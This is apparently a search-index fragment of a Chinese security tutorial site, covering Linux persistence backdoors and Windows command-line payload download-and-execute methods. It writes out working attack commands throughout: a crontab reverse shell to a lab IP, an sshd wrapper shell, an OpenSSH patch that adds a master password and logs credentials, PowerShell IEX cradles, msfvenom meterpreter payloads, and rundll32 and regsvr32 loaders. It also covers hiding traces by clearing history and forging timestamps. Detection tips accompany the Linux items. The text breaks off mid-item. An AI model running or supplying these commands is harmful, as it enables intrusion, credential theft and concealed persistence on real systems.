/tmp/su \u5728 /etc/pam.d/ \u76ee\u5f55\u4e0b\u5bfb\u627e\u5bf9\u5e94\u7684PAM\u914d\u7f6e\u6587\u4ef6(\u5982: /etc/pam.d/su)\uff0c\u4efb\u610f\u5bc6\u7801\u767b\u9646\u7684\u6838\u5fc3\u662f auth sufficient pam_rootok.so \uff0c\u6240\u4ee5\u53ea\u8981PAM\u914d\u7f6e\u6587\u4ef6\u4e2d\u5305\u542b\u6b64\u914d\u7f6e\u5373\u53efSSH\u4efb\u610f\u5bc6\u7801\u767b\u9646\uff0c\u9664\u4e86su\u4e2d\u4e4b\u5916\u8fd8\u6709chsh\u3001chfn\u540c\u6837\u53ef\u4ee5\u3002 \u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4e00\u53e5\u8bdd\u540e\u95e8\uff1a ln -sf /usr/sbin/sshd /tmp/su;/tmp/su -oPort=8888 \u6267\u884c\u5b8c\u4e4b\u540e\uff0c\u4efb\u4f55\u4e00\u53f0\u673a\u5668 ssh root@IP -p 8888 \uff0c\u8f93\u5165\u4efb\u610f\u5bc6\u7801\uff0c\u6210\u529f\u767b\u5f55\u3002 \u6392\u67e5\u6280\u5de7\uff1a\u8fdb\u7a0b\u3001\u7aef\u53e3\u90fd\u53ef\u4ee5\u53d1\u73b0\u5f02\u5e38\uff0c kill -s 9 PID \u7ed3\u675f\u8fdb\u7a0b\u5373\u53ef\u6e05\u9664\u540e\u95e8\u3002 5\u3001SSH wrapper \u9996\u5148\u542f\u52a8\u7684\u662f/usr/sbin/sshd,\u811a\u672c\u6267\u884c\u5230getpeername\u8fd9\u91cc\u7684\u65f6\u5019\uff0c\u6b63\u5219\u5339\u914d\u4f1a\u5931\u8d25\uff0c\u4e8e\u662f\u6267\u884c\u4e0b\u4e00\u53e5\uff0c\u542f\u52a8/usr/bin/sshd\uff0c\u8fd9\u662f\u539f\u59cbsshd\u3002\u539f\u59cb\u7684sshd\u76d1\u542c\u7aef\u53e3\u5efa\u7acb\u4e86tcp\u8fde\u63a5\u540e\uff0c\u4f1afork\u4e00\u4e2a\u5b50\u8fdb\u7a0b\u5904\u7406\u5177\u4f53\u5de5\u4f5c\u3002\u8fd9\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u6ca1\u6709\u4ec0\u4e48\u68c0\u9a8c\uff0c\u800c\u662f\u76f4\u63a5\u6267\u884c\u7cfb\u7edf\u9ed8\u8ba4\u7684\u4f4d\u7f6e\u7684/usr/sbin/sshd\uff0c\u8fd9\u6837\u5b50\u63a7\u5236\u6743\u53c8\u56de\u5230\u811a\u672c\u4e86\u3002\u6b64\u65f6\u5b50\u8fdb\u7a0b\u6807\u51c6\u8f93\u5165\u8f93\u51fa\u5df2\u88ab\u91cd\u5b9a\u5411\u5230\u5957\u63a5\u5b57\uff0cgetpeername\u80fd\u771f\u7684\u83b7\u53d6\u5230\u5ba2\u6237\u7aef\u7684TCP\u6e90\u7aef\u53e3\uff0c\u5982\u679c\u662f19526\u5c31\u6267\u884csh\u7ed9\u4e2ashell \u7b80\u5355\u70b9\u5c31\u662f\u4ecesshd fork\u51fa\u4e00\u4e2a\u5b50\u8fdb\u7a0b\uff0c\u8f93\u5165\u8f93\u51fa\u91cd\u5b9a\u5411\u5230\u5957\u63a5\u5b57\uff0c\u5e76\u5bf9\u8fde\u8fc7\u6765\u7684\u5ba2\u6237\u7aef\u7aef\u53e3\u8fdb\u884c\u4e86\u5224\u65ad\u3002 \u670d\u52a1\u7aef\uff1a cd /usr/sbin/ mv sshd ../bin/ echo '#!/usr/bin/perl' >sshd echo 'exec \"/bin/sh\" if(getpeername(STDIN) =~ /^..4A/);' >>sshd echo 'exec{\"/usr/bin/sshd\"} \"/usr/sbin/sshd\",@ARGV,' >>sshd chmod u+x sshd /etc/init.d/sshd restart \u5ba2\u6237\u7aef\uff1a socat STDIO TCP4:target_ip:22,sourceport=13377 #\u5982\u679c\u4f60\u60f3\u4fee\u6539\u6e90\u7aef\u53e3\uff0c\u53ef\u4ee5\u7528python\u7684struct\u6807\u51c6\u5e93\u5b9e\u73b0\u3002\u5176\u4e2dx00x00LF\u662f19526\u7684\u5927\u7aef\u5f62\u5f0f\uff0c\u4fbf\u4e8e\u4f20\u8f93\u548c\u5904\u7406\u3002 >>> import struct >>> buffer = struct.pack('>I6',19526) >>> print repr(buffer) '\\x00\\x00LF' >>> buffer = struct.pack('>I6',13377) >>> print buffer 4A \u6392\u67e5\u6280\u5de7\uff1a # ls -al /usr/sbin/sshd # cat /usr/sbin/sshd \u53ef\u901a\u8fc7\u91cd\u88c5ssh\u670d\u52a1\u6062\u590d\u3002 6\u3001strace\u540e\u95e8 \u901a\u8fc7\u547d\u4ee4\u66ff\u6362\u52a8\u6001\u8ddf\u8e2a\u7cfb\u7edf\u8c03\u7528\u548c\u6570\u636e\uff0c\u53ef\u4ee5\u7528\u6765\u8bb0\u5f55\u7528\u6237ssh\u3001su\u3001sudo\u7684\u64cd\u4f5c\u3002 #vim /etc/bashrc alias ssh='strace -o /tmp/.ssh.log -e read,write,connect -s 2048 ssh' # source /root/.bashrc \u6392\u67e5\u6280\u5de7\uff1a\u4f7f\u7528 alias \u5373\u53ef\u53d1\u73b0\u5f02\u5e38\u3002 7\u3001crontab\u53cd\u5f39shell crontab\u547d\u4ee4\u7528\u4e8e\u8bbe\u7f6e\u5468\u671f\u6027\u88ab\u6267\u884c\u7684\u6307\u4ee4\u3002\u65b0\u5efashell\u811a\u672c\uff0c\u5229\u7528\u811a\u672c\u8fdb\u884c\u53cd\u5f39\u3002 a\u3001\u521b\u5efashell\u811a\u672c\uff0c\u4f8b\u5982\u5728/etc/evil.sh #!/bin/bash bash -i >& /dev/tcp/192.168.28.131/12345 0>&1 chmod +sx /etc/evil.sh b\u3001crontab -e \u8bbe\u7f6e\u5b9a\u65f6\u4efb\u52a1 #\u6bcf\u4e00\u5206\u949f\u6267\u884c\u4e00\u6b21 */1 * * * * root /etc/evil.sh \u91cd\u542fcrond\u670d\u52a1\uff0c service crond restart \uff0c\u7136\u540e\u5c31\u53ef\u4ee5\u7528nc\u63a5\u6536shell\u3002 \u6392\u67e5\u6280\u5de7\uff1a # \u67e5\u770b\u53ef\u7591\u7684\u5b9a\u65f6\u4efb\u52a1\u5217\u8868 crontab -e 8\u3001openssh\u540e\u95e8 \u5229\u7528openssh\u540e\u95e8\uff0c\u8bbe\u7f6eSSH\u540e\u95e8\u5bc6\u7801\u53caroot\u5bc6\u7801\u8bb0\u5f55\u4f4d\u7f6e\uff0c\u9690\u853d\u6027\u8f83\u5f3a\uff0c\u4e0d\u6613\u88ab\u53d1\u73b0\u3002 a\u3001\u5907\u4efdSSH\u914d\u7f6e\u6587\u4ef6 mv /etc/ssh/ssh_config /etc/ssh/ssh_config.old mv /etc/ssh/sshd_config /etc/ssh/sshd_config.old b\u3001\u89e3\u538b\u5e76\u5b89\u88c5\u8865\u4e01 tar zxf openssh-5.9p1.tar.gz tar zxf openssh-5.9p1.tar.gz cp openssh-5.9p1.patch/sshbd5.9p1.diff /openssh-5.9p1 cd openssh-5.9p1 patch < sshbd5.9p1.diff c\u3001\u8bb0\u5f55\u7528\u6237\u540d\u548c\u5bc6\u7801\u7684\u6587\u4ef6\u4f4d\u7f6e\u53ca\u5176\u5bc6\u7801 vi includes.h #define ILOG \"/tmp/1.txt\" //\u8bb0\u5f55\u767b\u5f55\u672c\u673a\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 #define OLOG \"/tmp/2.txt\" //\u8bb0\u5f55\u672c\u673a\u767b\u5f55\u8fdc\u7a0b\u7684\u7528\u6237\u540d\u548c\u5bc6\u7801 #define SECRETPW \"123456789\" //\u540e\u95e8\u7684\u5bc6\u7801 d\u3001\u4fee\u6539\u7248\u672c\u4fe1\u606f vi version.h #define SSH_VERSION \"\u586b\u5165\u4e4b\u524d\u8bb0\u4e0b\u6765\u7684\u7248\u672c\u53f7,\u4f2a\u88c5\u539f\u7248\u672c\" #define SSH_PORTABLE \"\u5c0f\u7248\u672c\u53f7\" e\u3001\u5b89\u88c5\u5e76\u7f16\u8bd1 ./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 make clean make && make install service sshd restart f\u3001\u5bf9\u6bd4\u539f\u6765\u7684\u914d\u7f6e\u6587\u4ef6\uff0c\u4f7f\u914d\u7f6e\u6587\u4ef6\u4e00\u81f4\uff0c\u7136\u540e\u4fee\u6539\u6587\u4ef6\u65e5\u671f\u3002 touch -r /etc/ssh/ssh_config.old /etc/ssh/ssh_config touch -r /etc/ssh/sshd_config.old /etc/ssh/sshd_config g\u3001\u6e05\u9664\u64cd\u4f5c\u8bb0\u5f55 export HISTFILE=/dev/null export HISTSIZE=0 echo >/root/.bash_history //\u6e05\u7a7a\u64cd\u4f5c\u65e5\u5fd7 \u6392\u67e5\u6280\u5de7\uff1a\u5229\u7528strace\u627e\u51fassh\u540e\u95e8. # 1\u3001\u83b7\u53d6\u53ef\u7591\u8fdb\u7a0bPI ps aux | grep sshd # 2\u3001\u8ddf\u8e2asshd PID strace -o aa -ff -p PID # 3\u3001\u67e5\u770b\u8bb0\u5f55\u5bc6\u7801\u6253\u5f00\u6587\u4ef6 grep open sshd* | grep -v -e No -e null -e denied| grep WR 9\u3001PAM\u540e\u95e8 PAM \uff08Pluggable Authentication Modules \uff09\u662f\u7531Sun\u63d0\u51fa\u7684\u4e00\u79cd\u8ba4\u8bc1\u673a\u5236\u3002\u5b83\u901a\u8fc7\u63d0\u4f9b\u4e00\u4e9b\u52a8\u6001\u94fe\u63a5\u5e93\u548c\u4e00\u5957\u7edf\u4e00\u7684API\uff0c\u5c06\u7cfb\u7edf\u63d0\u4f9b\u7684\u670d\u52a1\u548c\u8be5\u670d\u52a1\u7684\u8ba4\u8bc1\u65b9\u5f0f\u5206\u5f00\uff0c\u4f7f\u5f97\u7cfb\u7edf\u7ba1\u7406\u5458\u53ef\u4ee5\u7075\u6d3b\u5730\u6839\u636e\u9700\u8981\u7ed9\u4e0d\u540c\u7684\u670d\u52a1\u914d\u7f6e\u4e0d\u540c\u7684\u8ba4\u8bc1\u65b9\u5f0f\u800c\u65e0\u9700\u66f4\u6539\u670d\u52a1\u7a0b\u5e8f\uff0c\u540c\u65f6\u4e5f\u4fbf\u4e8e\u5411\u7cfb\u7edf\u4e2d\u6dfb\u52a0\u65b0\u7684\u8ba4\u8bc1\u624b\u6bb5\u3002PAM\u6700\u521d\u662f\u96c6\u6210\u5728Solaris\u4e2d\uff0c\u76ee\u524d\u5df2\u79fb\u690d\u5230\u5176\u5b83\u7cfb\u7edf\u4e2d\uff0c\u5982Linux\u3001SunOS\u3001HP-UX 9.0\u7b49\u3002 \u5229\u7528\u65b9\u6cd5: 1\u3001\u83b7\u53d6\u76ee\u6807\u7cfb\u7edf\u6240\u4f7f\u7528\u7684PAM\u7248\u672c\uff0c\u4e0b\u8f7d\u5bf9\u5e94\u7248\u672c\u7684pam\u7248\u672c 2\u3001\u89e3\u538b\u7f29\uff0c\u4fee\u6539pam_unix_auth.c\u6587\u4ef6\uff0c\u6dfb\u52a0\u4e07\u80fd\u5bc6\u7801 3\u3001\u7f16\u8bd1\u5b89\u88c5PAM 4\u3001\u7f16\u8bd1\u5b8c\u540e\u7684\u6587\u4ef6\u5728\uff1amodules/pam_unix/.libs/pam_unix.so\uff0c\u590d\u5236\u5230/lib64/security\u4e2d\u8fdb\u884c\u66ff\u6362\uff0c\u5373\u53ef\u4f7f\u7528\u4e07\u80fd\u5bc6\u7801\u767b\u9646\uff0c\u5e76\u5c06\u7528\u6237\u540d\u5bc6\u7801\u8bb0\u5f55\u5230\u6587\u4ef6\u4e2d\u3002 \u6392\u67e5\u6280\u5de7\uff1a # 1\u3001\u901a\u8fc7Strace\u8ddf\u8e2assh ps axu | grep sshd strace -o aa -ff -p PID grep open aa* | grep -v -e No -e null -e denied| grep WR # 2\u3001\u68c0\u67e5pam_unix.so\u7684\u4fee\u6539\u65f6\u95f4 stat /lib/security/pam_unix.so #32\u4f4d stat /lib64/security/pam_unix.so #64\u4f4d 10\u3001rookit\u540e\u95e8 Mafix\u662f\u4e00\u6b3e\u5e38\u7528\u7684\u8f7b\u91cf\u5e94\u7528\u7ea7\u522bRootkits\uff0c\u662f\u901a\u8fc7\u4f2a\u9020ssh\u534f\u8bae\u6f0f\u6d1e\u5b9e\u73b0\u8fdc\u7a0b\u767b\u9646\u7684\u7279\u70b9\u662f\u914d\u7f6e\u7b80\u5355\u5e76\u53ef\u4ee5\u81ea\u5b9a\u4e49\u9a8c\u8bc1\u5bc6\u7801\u548c\u7aef\u53e3\u53f7\u3002 \u5229\u7528\u65b9\u6cd5\uff1a\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u4f7f\u7528ssh \u7528\u6237@IP -P \u914d\u7f6e\u7684\u7aef\u53e3\uff0c\u5373\u53ef\u8fdc\u7a0b\u767b\u5f55\u3002 \u8fde\u63a5\u540e\u7684\u622a\u56fe\uff1a \u6392\u67e5\u6280\u5de7\uff1a\u67e5\u770b\u7aef\u53e3\u662f\u5426\u5f02\u5e38\uff0cRPM check\u67e5\u770b\u547d\u4ee4\u662f\u5426\u88ab\u66ff\u6362\u3002","title":"\u7b2c4\u7bc7\uff1aLinux\u6743\u9650\u7ef4\u6301--\u540e\u95e8\u7bc7"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC03%E7%AB%A0%EF%BC%9A%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E7%AF%87/%E7%AC%AC5%E7%AF%87%EF%BC%9AWindows%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%96%B9%E5%BC%8F%E6%B1%87%E6%80%BB/","text":"\u5f53\u6211\u4eec\u901a\u8fc7Web\u6e17\u900f\u83b7\u53d6\u4e86\u4e00\u4e2aShell\uff0c\u800c\u4e14\u76ee\u6807\u4e3b\u673a\u662fWindows\uff0c\u6211\u4eec\u8be5\u600e\u4e48\u53bb\u4e0b\u8f7d\u540e\u95e8\u6587\u4ef6\u5230\u76ee\u6807\u4e3b\u673a\u4e0a\u6267\u884c\u5462\uff1f \u4e00\u822c\u6765\u8bf4\uff0c\u5b9e\u73b0Windows\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u65b9\u5f0f\u4e0d\u5916\u4e4e\u4ee5\u4e0b\u51e0\u79cd\u65b9\u5f0f\u3002\u7b2c\u4e00\u79cd\uff0c\u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u5230\u672c\u5730\uff0c\u7136\u540e\u518d\u6267\u884c\uff1b \u7b2c\u4e8c\u79cd\uff0c\u8fdc\u7a0b\u4e0b\u8f7d\u6267\u884c\uff0c\u6267\u884c\u8fc7\u7a0b\u6ca1\u6709\u4e8c\u8fdb\u5236\u6587\u4ef6\u843d\u5730\uff0c\u8fd9\u79cd\u65b9\u5f0f\u5df2\u7136\u6210\u4e3a\u540e\u95e8\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u9996\u8981\u65b9\u5f0f** \u3002**\u53e6\u5916\u5462\uff0c\u53ea\u8981\u4f60\u6240\u5728\u670d\u52a1\u5668\u7684\u73af\u5883\u652f\u6301\uff0c\u4f60\u4e5f\u53ef\u4ee5\u901a\u8fc7\u4efb\u4f55\u4e00\u95e8\u8bed\u8a00\u6765\u5b9e\u73b0\u5b83\uff0c\u8fd9\u79cd\u65b9\u5f0f\u6682\u4e0d\u5728\u672c\u6587\u7684\u8ba8\u8bba\u8303\u56f4\u4e4b\u5185\u3002 \u5728\u8fd9\u91cc\uff0c****\u672c\u6587\u6536\u96c6\u4e8615\u79cd\u5e38\u89c1\u7684\u6587\u4ef6\u4e0b\u8f7d\u6267\u884c\u7684\u65b9\u5f0f\uff0c\u5e76\u7ed3\u5408\u5177\u4f53\u6848\u4f8b \uff0c\u8ba9\u6211\u4eec\u4e00\u8d77\u6765\u770b\u770b\u662f\u600e\u4e48\u5b9e\u73b0\u7684\u5427\u3002 PowerShell Bitsadmin certutil wget ipc$\u6587\u4ef6\u5171\u4eab FTP TFTP WinScp msiexec IEExec mshta rundll32 regsvr32 MSXSL.EXE pubprn.vbs 1\u3001PowerShell PowerShell\u662f\u4e00\u79cd\u547d\u4ee4\u884c\u5916\u58f3\u7a0b\u5e8f\u548c\u811a\u672c\u73af\u5883\uff0c\u4f7f\u547d\u4ee4\u884c\u7528\u6237\u548c\u811a\u672c\u7f16\u5199\u8005\u53ef\u4ee5\u5229\u7528\u3002 \u8fdc\u7a0b\u4e0b\u8f7d\u6587\u4ef6\u4fdd\u5b58\u5728\u672c\u5730\uff1a powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.28.128/imag/evil.txt','evil.exe') \u8fdc\u7a0b\u6267\u884c\u547d\u4ee4\uff1a powershell -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring('http://192.168.28.128/imag/evil.txt'))\" 2\u3001Bitsadmin bitsadmin\u662f\u4e00\u4e2a\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u53ef\u7528\u4e8e\u521b\u5efa\u4e0b\u8f7d\u6216\u4e0a\u4f20\u5de5\u4f5c\u548c\u76d1\u6d4b\u5176\u8fdb\u5c55\u60c5\u51b5\u3002 bitsadmin /transfer n http://192.168.28.128/imag/evil.txt d:\\test\\1.txt \u8f93\u5165\u4ee5\u4e0a\u547d\u4ee4\uff0c\u6210\u529f\u4e0b\u8f7d\u6587\u4ef6\u3002 3\u3001certutil \u7528\u4e8e\u5907\u4efd\u8bc1\u4e66\u670d\u52a1\uff0c\u652f\u6301xp-win10\u90fd\u652f\u6301\u3002\u7531\u4e8ecertutil\u4e0b\u8f7d\u6587\u4ef6\u90fd\u4f1a\u7559\u4e0b\u7f13\u5b58\uff0c\u6240\u4ee5\u4e00\u822c\u90fd\u5efa\u8bae\u4e0b\u8f7d\u5b8c\u6587\u4ef6\u540e\u5bf9\u7f13\u5b58\u8fdb\u884c\u5220\u9664\u3002 \u6ce8\uff1a\u7f13\u5b58\u76ee\u5f55\u4e3a\uff1a\"%USERPROFILE%\\AppData\\LocalLow\\Microsoft\\CryptnetUrlCache\\Content\" #\u4e0b\u8f7d\u6587\u4ef6 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php #\u5220\u9664\u7f13\u5b58 certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete 4\u3001wget Windows\u73af\u5883\u4e0b\uff0c\u53ef\u4e0a\u4f20\u514d\u5b89\u88c5\u7684\u53ef\u6267\u884c\u7a0b\u5e8fwget.exe\u5230\u76ee\u6807\u673a\u5668\uff0c\u4f7f\u7528wget\u4e0b\u8f7d\u6587\u4ef6\u3002 wget.exe\u4e0b\u8f7d\uff1a https://eternallybored.org/misc/wget/ wget -O \"evil.txt\" http://192.168.28.128/imag/evil.txt 5\u3001ipc$\u6587\u4ef6\u5171\u4eab IPC$(Internet Process Connection)\u662f\u5171\u4eab\"\u547d\u540d\u7ba1\u9053\"\u7684\u8d44\u6e90\uff0c\u5b83\u662f\u4e3a\u4e86\u8ba9\u8fdb\u7a0b\u95f4\u901a\u4fe1\u800c\u5f00\u653e\u7684\u547d\u540d\u7ba1\u9053\uff0c\u901a\u8fc7\u63d0\u4f9b\u53ef\u4fe1\u4efb\u7684\u7528\u6237\u540d\u548c\u53e3\u4ee4\uff0c\u8fde\u63a5\u53cc\u65b9\u53ef\u4ee5\u5efa\u7acb\u5b89\u5168\u7684\u901a\u9053\u5e76\u4ee5\u6b64\u901a\u9053\u8fdb\u884c\u52a0\u5bc6\u6570\u636e\u7684\u4ea4\u6362\uff0c\u4ece\u800c\u5b9e\u73b0\u5bf9\u8fdc\u7a0b\u8ba1\u7b97\u673a\u7684\u8bbf\u95ee\u3002 #\u5efa\u7acb\u8fdc\u7a0bIPC\u8fde\u63a5 net use \\\\192.168.28.128\\ipc$ /user:administrator \"abc123!\" #\u590d\u5236\u8fdc\u7a0b\u6587\u4ef6\u5230\u672c\u5730\u4e3b\u673a copy \\\\192.168.28.128\\c$\\2.txt D:\\test **6\u3001FTP ** \u4e00\u822c\u60c5\u51b5\u4e0b\u653b\u51fb\u8005\u4f7f\u7528FTP\u4e0a\u4f20\u6587\u4ef6\u9700\u8981\u5f88\u591a\u4ea4\u4e92\u7684\u6b65\u9aa4\uff0c\u4e0b\u9762\u8fd9\u4e2a bash\u811a\u672c\uff0c\u8003\u8651\u5230\u4e86\u4ea4\u4e92\u7684\u60c5\u51b5\uff0c\u53ef\u4ee5\u76f4\u63a5\u6267\u884c\u5e76\u4e0d\u4f1a\u4ea7\u751f\u4ea4\u4e92\u52a8\u4f5c\u3002 ftp 127.0.0.1 username password get file exit 7\u3001TFTP \u7528\u6765\u4e0b\u8f7d\u8fdc\u7a0b\u6587\u4ef6\u7684\u6700\u7b80\u5355\u7684\u7f51\u7edc\u534f\u8bae\uff0c\u5b83\u57fa\u4e8eUDP\u534f\u8bae\u800c\u5b9e\u73b0 tftp32\u670d\u52a1\u7aef\u4e0b\u8f7d\u5730\u5740\uff1a http://tftpd32.jounin.net/tftpd32_download.html tftp -i \u4f60\u7684IP get \u8981\u4e0b\u8f7d\u6587\u4ef6 \u5b58\u653e\u4f4d\u7f6e 8\u3001WinScp WinSCP\u662f\u4e00\u4e2aWindows\u73af\u5883\u4e0b\u4f7f\u7528SSH\u7684\u5f00\u6e90\u56fe\u5f62\u5316SFTP\u5ba2\u6237\u7aef\u3002 #\u4e0a\u4f20 winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"put D:\\1.txt /tmp/\" \"exit\" /log=log_file.txt #\u4e0b\u8f7d winscp.exe /console /command \"option batch continue\" \"option confirm off\" \"open sftp://bypass:abc123!@192.168.28.131:22\" \"option transfer binary\" \"get /tmp D:\\test\\app\\\" \"exit\" /log=log_file.tx \u4f7f\u7528winscp.exe \u4f5c\u4e3a\u547d\u4ee4\u884c\u53c2\u6570\u6267\u884c\u8fdc\u7a0b\u4e0a\u4f20/\u4e0b\u8f7d\u64cd\u4f5c\u3002 9\u3001msiexec msiexec \u652f\u6301\u8fdc\u7a0b\u4e0b\u8f7d\u529f\u80fd\uff0c\u5c06msi\u6587\u4ef6\u4e0a\u4f20\u5230\u670d\u52a1\u5668\uff0c\u901a\u8fc7\u5982\u4e0b\u547d\u4ee4\u8fdc\u7a0b\u6267\u884c\uff1a #\u751f\u6210msi\u5305 msfvenom -p windows/exec CMD='net user test abc123! /add' -f msi > evil.msi #\u8fdc\u7a0b\u6267\u884c msiexec /q /i http://192.168.28.128/evil.msi \u6210\u529f\u6dfb\u52a0\u4e86\u4e00\u4e2atest\u7528\u6237\uff1a 10\u3001IEExec IEexec.exe\u5e94\u7528\u7a0b\u5e8f\u662f.NET Framework\u9644\u5e26\u7a0b\u5e8f\uff0c\u5b58\u5728\u4e8e\u591a\u4e2a\u7cfb\u7edf\u767d\u540d\u5355\u5185\u3002 \u751f\u6210Payload\uff1a msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.28.131 lport=4444 -f exe -o evil.exe \u4f7f\u7528\u7ba1\u7406\u5458\u8eab\u4efd\u6253\u5f00cmd\uff0c\u5206\u522b\u8fd0\u884c\u4e0b\u9762\u4e24\u6761\u547d\u4ee4\u3002 C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>caspol.exe -s off C:\\Windows\\Microsoft.NET\\Framework64\\v2.0.50727>IEExec.exe http://192.168.28.131/evil.exe 11\u3001mshta mshta\u7528\u4e8e\u6267\u884c.hta\u6587\u4ef6\uff0c\u800chta\u662fHTML Applocation \u7684\u7f29\u5199\uff0c\u4e5f\u5c31\u662fHTML\u5e94\u7528\u7a0b\u5e8f\u3002\u800chta\u4e2d\u4e5f\u652f\u6301VBS\u3002\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5229\u7528hta\u6765\u4e0b\u8f7d\u6587\u4ef6\u3002 mshta http://192.168.28.128/run.hta run.hta\u5185\u5bb9\u5982\u4e0b\uff1a <HTML> <meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\"> <HEAD> <script language=\"VBScript\"> Window.ReSizeTo 0, 0 Window.moveTo -2000,-2000 Set objShell = CreateObject(\"Wscript.Shell\") objShell.Run \"cmd.exe /c net user test password /add\" // \u8fd9\u91cc\u586b\u5199\u547d\u4ee4 self.close </script> <body> demo </body> </HEAD> </HTML> 12\u3001rundll32 \u5176\u5b9e\u8fd8\u662f\u4f9d\u8d56\u4e8eWScript.shell\u8fd9\u4e2a\u7ec4\u4ef6\uff0c\u5728\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528JSRat\u6765\u505a\u6f14\u793a\uff0cJSRat\u662f\u4e00\u4e2a\u547d\u4ee4\u548c\u63a7\u5236\u6846\u67b6\uff0c\u4ec5\u4e3arundll32.exe\u548cregsvr32.exe\u751f\u6210\u6076\u610f\u7a0b\u5e8f\u3002 \u9879\u76ee\u5730\u5740\uff1a https://github.com/Hood3dRob1n/JSRat-Py.git \u6b65\u9aa4\u4e00\uff1a\u5f00\u59cb\u8fd0\u884cJSRat\uff0c\u76d1\u542c\u672c\u57308888\u7aef\u53e3\u3002 \u6b65\u9aa4\u4e8c\uff1a\u901a\u8fc7url\u8bbf\u95ee\uff0c\u53ef\u4ee5\u67e5\u770b\u6076\u610f\u4ee3\u7801\u3002 \u590d\u5236\u4ee3\u7801\u5982\u4e0b\uff1a rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");h.Open(\"GET\",\"http://192.168.28.131:8888/connect\",false);try{h.Send();b=h.ResponseText;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);} \u6b65\u9aa4\u4e09\uff1a\u5728\u53d7\u5bb3\u8005PC\u8fd0\u884c\u8be5\u4ee3\u7801\uff0c\u5c06\u6210\u529f\u8fd4\u56de\u4e00\u4e2a\u4f1a\u8bdd\uff0c\u5982\u4e0b\u56fe\u6240\u793a\uff1a **13\u3001regsvr32 ** Regsvr32\u547d\u4ee4\u7528\u4e8e\u6ce8\u518cCOM\u7ec4\u4ef6\uff0c\u662fWindows\u7cfb\u7edf\u63d0\u4f9b\u7684\u7528\u6765\u5411\u7cfb\u7edf\u6ce8\u518c\u63a7\u4ef6\u6216\u8005\u5378\u8f7d\u63a7\u4ef6\u7684\u547d\u4ee4\uff0c\u4ee5\u547d\u4ee4\u884c\u65b9\u5f0f\u8fd0\u884c \u5728\u76ee\u6807\u673a\u4e0a\u6267\u884c\uff1a regsvr32.exe /u /n /s /i:http://192.168.28.131:8888/file.sct scrobj.dll \u53ef\u4ee5\u901a\u8fc7\u81ea\u5df1\u6784\u9020.sct\u6587\u4ef6\uff0c\u53bb\u4e0b\u8f7d\u6267\u884c\u6211\u4eec\u7684\u7a0b\u5e8f <?XML version=\"1.0\"?> <scriptlet> <registration progid=\"ShortJSRAT\" classid=\"{10001111-0000-0000-0000-0000FEEDACDC}\" > <script language=\"JScript\"> <![CDATA[ ps = \"cmd.exe /c calc.exe\"; new ActiveXObject(\"WScript.Shell\").Run(ps,0,true); ]]> </script> </registration> </scriptlet> \u6267\u884c\u547d\u4ee4\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668\uff1a 14\u3001MSXSL.EXE msxsl.exe\u662f\u5fae\u8f6f\u7528\u4e8e\u547d\u4ee4\u884c\u4e0b\u5904\u7406XSL\u7684\u4e00\u4e2a\u7a0b\u5e8f\uff0c\u6240\u4ee5\u901a\u8fc7\u4ed6\uff0c\u6211\u4eec\u53ef\u4ee5\u6267\u884cJavaScript\u8fdb\u800c\u6267\u884c\u7cfb\u7edf\u547d\u4ee4\u3002 \u4e0b\u8f7d\u5730\u5740\u4e3a\uff1a https://www.microsoft.com/en-us/download/details.aspx?id=21714 msxsl.exe \u9700\u8981\u63a5\u53d7\u4e24\u4e2a\u6587\u4ef6\uff0cXML\u53caXSL\u6587\u4ef6\uff0c\u53ef\u4ee5\u8fdc\u7a0b\u52a0\u8f7d\uff0c\u5177\u4f53\u65b9\u5f0f\u5982\u4e0b\uff1a msxsl http://192.168.28.128/scripts/demo.xml http://192.168.28.128/scripts/exec.xsl demo.xml <?xml version=\"1.0\"?> <?xml-stylesheet type=\"text/xsl\" href=\"exec.xsl\" ?> <customers> <customer> <name>Microsoft</name> </customer> </customers> exec.xsl <?xml version='1.0'?> <xsl:stylesheet version=\"1.0\" xmlns:xsl=\"http://www.w3.org/1999/XSL/Transform\" xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\" xmlns:user=\"http://mycompany.com/mynamespace\"> <msxsl:script language=\"JScript\" implements-prefix=\"user\"> function xml(nodelist) { var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd /c calc.exe\"); return nodelist.nextNode().xml; } </msxsl:script> <xsl:template match=\"/\"> <xsl:value-of select=\"user:xml(.)\"/> </xsl:template> </xsl:stylesheet> 15\u3001pubprn.vbs \u5728Windows 